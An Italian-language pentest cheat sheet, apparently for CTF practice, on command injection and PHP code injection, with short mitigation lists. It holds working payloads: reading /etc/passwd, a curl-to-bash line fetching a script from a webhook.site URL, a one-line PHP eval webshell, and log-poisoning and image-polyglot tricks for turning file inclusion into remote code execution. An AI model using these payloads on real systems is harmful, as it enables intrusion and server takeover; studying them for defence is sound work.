# Command Injection

### **Obiettivo**
Eseguire comandi arbitrari sul server.

### **Payload di Base**

- **Esegui un comando semplice:**
    ```text
  ; ls -la
  && cat /etc/passwd
  || whoami
    ```

- **Crea un file:**
    ```text
  `touch /tmp/hacked`
  ; touch /tmp/hacked
    ```

- **Comandi complessi:**
    ```text
  ; curl https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32/shell.sh | bash
    ```

### **Mitigazione**
- Usa funzioni sicure come `escapeshellarg()`.
- Non concatenare input utente in comandi di shell.

---

# Code Injection (PHP)

### **Obiettivo**
Iniettare codice sorgente valido (es. PHP) affinché venga eseguito direttamente dall'interprete del linguaggio, invece che dalla shell di sistema.

### **Sinks Vulnerabili Comuni**
In PHP, l'esecuzione dinamica avviene solitamente se l'input finisce in funzioni come:
- `eval()`
- `assert()` (in vecchie versioni o mal configurate)
- `create_function()`

### **Payload di Base**

- **Webshell Minimale (One-Liner):**
    ```php
    <?php eval($_GET['c']); ?>
    ```
    (Permette di passare poi i comandi via parametro: `&c=print_r(scandir('.'));`)

- **Bypass di disable_functions (se system/exec sono bloccati):**
    ```php
    print_r(scandir('.')); // Esplora la directory
    echo file_get_contents('/flag.txt'); // Legge file
    ```

### **Da LFI a Code Injection (RCE)**
Se c'è un `include($_GET['page'])`, puoi forzarlo a eseguire il tuo codice PHP:
1. **File Poisoning (Log):** Inietta `<?php system($_GET['cmd']); ?>` nell'header `User-Agent` e includi il log (es. `?page=/var/log/apache2/access.log&cmd=whoami`).
2. **Upload Polyglot:** Nascondi il payload PHP nei metadati EXIF di un'immagine `.jpg` caricata regolarmente, e includila (es. `?page=uploads/avatar.jpg&cmd=id`).

### **Mitigazione**
- Evitare **sempre** l'esecuzione dinamica di codice utente (`eval`, `assert`).
- Per l'inclusione di file (`include`), usare whitelist o array associativi con percorsi statici (hardcoded), mai input diretti.
- Limitare le funzioni pericolose (`disable_functions` in `php.ini`).
